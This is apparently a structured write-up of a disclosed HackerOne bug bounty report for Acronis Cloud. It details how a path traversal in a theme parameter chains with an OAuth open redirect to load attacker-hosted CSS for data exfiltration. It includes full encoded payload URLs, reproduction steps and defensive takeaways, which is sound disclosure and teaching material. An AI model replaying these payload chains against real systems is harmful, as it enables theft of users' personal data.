# CSS Injection via Client Side Path Traversal + Open Redirect leads to personal data exfiltration on Acronis Cloud

## Metadata
- **Source:** HackerOne
- **Report:** 1245165 | https://hackerone.com/reports/1245165
- **Submitted:** 2021-06-26
- **Reporter:** mr-medi
- **Program:** Acronis
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** CSS Injection, Relative Path Overwrite (RPO), Open Redirect, Path Traversal, Information Disclosure
- **CVEs:** None
- **Category:** web-api

## Summary
A combination of three vulnerabilities in Acronis Cloud Management Console allows attackers to exfiltrate personal data through CSS injection. By chaining path traversal in the color_scheme parameter with an open redirect in the OAuth authorization endpoint, an attacker can force the browser to load a malicious CSS file from an external domain, enabling data extraction via CSS selectors.

## Attack scenario
1. Attacker identifies that the color_scheme GET parameter is concatenated into a CSS file path without sanitization (theme.PARAMETER.css)
2. Attacker crafts a path traversal payload using URL-encoded slashes (%2F) and dots to escape the intended directory structure
3. Attacker discovers an open redirect vulnerability in /api/2/idp/authorize/ endpoint via the controllable 'state' parameter
4. Attacker combines both vulnerabilities by setting color_scheme to traverse to the open redirect endpoint with state parameter pointing to attacker-controlled CSS
5. Victim visits attacker's crafted URL containing the malicious color_scheme parameter
6. Browser loads the malicious CSS file through the redirect chain, allowing CSS-based exfiltration of sensitive customer/partner data visible in the DOM

## Root cause
Lack of input validation and sanitization on the color_scheme parameter combined with insufficient restrictions on open redirects and absence of Content-Security-Policy headers to prevent external CSS loading

## Attacker mindset
The attacker demonstrates sophisticated vulnerability chaining - recognizing that individual vulnerabilities (path traversal, open redirect, CSS injection) are low-severity but become critical when combined. The attacker understands browser behavior with CSS file loading and HTTP redirects, and exploits the presence of sensitive customer/partner identifiers in the page DOM.

## Defensive takeaways
- Implement strict input validation on all URL parameters, particularly those used in file path construction - use allowlist approach for color_scheme values
- Sanitize and validate redirect URIs in OAuth endpoints; implement strict whitelist of permitted redirect domains
- Apply Content-Security-Policy headers to prevent loading stylesheets from untrusted sources
- Never allow user-controlled input to be directly concatenated into file paths; use indirect mapping or configuration objects
- Implement proper URL encoding/decoding validation to prevent bypasses with double-encoding
- Add HTTP response headers (X-Content-Type-Options: nosniff, X-Frame-Options) to prevent content-type confusion attacks
- Regular security testing for vulnerability chaining scenarios, not just individual flaws
- Monitor and audit all OAuth authorization flows for open redirect vulnerabilities

## Variant hunting
Look for other GET/POST parameters used in file path construction across the application
Test other OAuth/OIDC endpoints for similar open redirect vulnerabilities
Check for path traversal in other theme/customization endpoints
Search for other locations where user input is reflected in stylesheet loading
Test if similar path traversal works with other file types (JS, images) leading to different impacts
Investigate if the vulnerability affects other subdomains or applications within Acronis infrastructure
Check for CORS misconfigurations that could amplify CSS injection attacks

## MITRE ATT&CK
- T1190
- T1559
- T1566
- T1598
- T1005
- T1052

## Notes
This is an excellent example of vulnerability chaining where three moderate/low-severity issues combine to create a high-severity attack. The reporter demonstrates deep understanding of browser mechanics, OAuth flows, and CSS-based data exfiltration. The attack requires user interaction (visiting a malicious link) but the impact is significant as it exposes sensitive customer and partner identifiable information. The use of URL encoding tricks (%2F for /, %25 for %) to bypass filters is notable. The fact that sensitive data exists in the DOM of the authenticated page makes this particularly dangerous.

## Full report
<details><summary>Expand</summary>

## Summary

Hi team, I hope everything goes well.
I have found a CSS Injection in Acronis Cloud Management Console`https://mc-beta-cloud.acronis.com/mc` via the `color_scheme` GET parameter.

## Description:

The flow work as I will comment below.

If we go to the URL` https://mc-beta-cloud.acronis.com/mc/?color_scheme=PARAMETER` we can see by looking at the javascript code that it will get the `color_scheme` GET parameter and will make a GET request concatenating the previous value to the URL of the CSS file, in this case is the following URL `https://mc-beta-cloud.acronis.com/mc/theme.PARAMETER.css` to request the CSS file and load it.

You can see it in the following image the request made to load the CSS commented bellow:

{F1354281}

Since the front end doesn't sanitize the values `.` and `/` its possible to perform a `path traversal `to request the CSS file from other path. 
For example, if you go to:
`https://mc-beta-cloud.acronis.com/mc/?color_scheme=%2F..%2F..%2FPARAMETER`

You will notice a GET request is being made to the following URL, confirming the `Relative Path Overwrite` issue:
`https://mc-beta-cloud.acronis.com/PARAMETER.css?v=24.0.10942`

You can see it in the following image too:

{F1354280}


This little issue by itself doesn't appear to be any security issue but if we combine it with a `open redirect` it could be possible to make a request to the vulnerable endpoint to the open redirect and redirect to the domain where the evil CSS file is stored, this attack is possible because when we load any CSS file by default it follows all the redirects specified in the HTTP header `Location`.

While looking at the HTTP requests to see if I could find any open redirect and demonstrate the impact I notice one interesting API endpoint 
`https://mc-beta-cloud.acronis.com/api/2/idp/authorize/?client_id=fb2bf44e-ac14-444a-b2a9-e5e81fe73b80&redirect_uri=%2Fhci%2Fcallback&response_type=code&scope=openid&state=http://localhost&nonce=bhgjuvrrvpwauibleqhvfqat`.
Notice the `state` GET parameter is controllable by the user so we can specify any external domain where to redirect the user.

Let's see the response to the previous request:
{F1354247}

And if we follow the `Location` HTTP header to the endpoint `https://mc-beta-cloud.acronis.com/hci/callback?code=FSNuJgJAWX2HOVFg%3D%3D&state=http://localhost` we can confirm the `Open Redirect` issue:

{F1354248}

I have been digging into it and by creating other account I confirmed that if any user make a request to the first endpoint with the same GET parameters as `client_id`,  `redirect_uri`, `response_type`, `scope`,  `state` and `nonce` it will be redirected to `http://localhost` so once we know that there is no need to guess any user parameter as `client_id` makes the attack more easy because the user only needs to visit a link with a crafted `color_scheme` parameter and the same parameters for the open redirect seen bellow.


Once we confirmed the `Relative Path Overwrite` and `Open Redirect` let's put it all together to make the exploit.
We know that when we load any CSS file it follows all the redirects specified in the HTTP header `Location` so if we are able to overwrite the relative path to the vulnerable Open Redirect endpoint, redirecting the user to the CSS file of my domain we can exfiltrate user personal information by using CSS properties.

By putting together these two tricks if the `color_sheme` have the value:

`%2F..%2F..%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat`

You will notice that the first thing we do in the previous payload is `Overwrite the Relative Path` to the root directory. Then we specify the endpoint vulnerable to the `Open redirect` and in this vulnerable endpoint redirect the user to `http://localhost/core/css.css` where is in my case the evil CSS file stored.
As a result the browser will load it and we can perform the exfiltration of personal data.

The final URL to load the external CSS will looks like this:

`https://mc-beta-cloud.acronis.com/mc/?color_sheme=%2F..%2F..%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat`
Make sure you correctly URL encode it.


In my previous report of CSS Injection #1054406 the vulnerable endpoint is `https://mc-beta-cloud.acronis.com/mc/branding-scheme.html` which is used just to show the final result of the page with some custom style, if you take a look at the `DOM` of the previous URL there is no personal information related so the severity of the issue is reduced but in this scenario is different since the `DOM` have many hash related to the `customer` and `partners` ID's 

In this way, if we specify our CSS file in a domain hosted by us we can perform the CSRF attack via GET requests by loading an external image using CSS properties like background-image or exfiltrate user information like his IP, Referer header or User Agent.
In my explanation I used my local server but you can check it out in any external domain you own.

## Steps To Reproduce

  1- Host the following CSS file in your server, in my example  called it core.css.
```css
html
{
  background-color: black;
  color: green;
}
```
In my case I hosted it in the `css` folder of my local server, so the `state` GET of the payload parameter must be `http://loalhost/css/core.css`
  2- Go to `https://mc-beta-cloud.acronis.com` and login in your Acronis Cloud account as a `partner`.
  3- Finally, go to `https://mc-beta-cloud.acronis.com/mc/?color_sheme=%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat` and 

You could see the following CSS injected:

{F1354330}

And the request of the CSS made:

{F1354338}


Best regards and have a nice day,
@mr-medi

## Impact

Data exfiltration via CSS properties as `background-image` its possible as you can see in the following link `https://github.com/maxchehab/CSS-Keylogging/`.

I will dig to see what more information about the user I can exfiltrate apart from the Hashes of partners and customer accounts.

</details>

---
*Analysed by Claude on 2026-05-24*
